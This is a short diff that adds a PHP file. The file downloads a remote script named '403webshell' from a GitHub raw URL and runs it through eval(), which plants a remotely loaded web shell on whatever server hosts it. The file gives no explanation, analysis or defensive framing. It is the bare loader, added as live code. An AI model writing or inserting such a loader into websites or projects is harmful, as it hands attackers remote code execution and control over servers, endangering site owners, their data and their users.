@@ -1,0 +1,6 @@
+<?php
+
+$content = file_get_contents(urldecode('https://raw.githubusercontent.com/41121120076/shell/refs/heads/main/403webshell'));
+
+$content = "?> ".$content;
+eval($content);
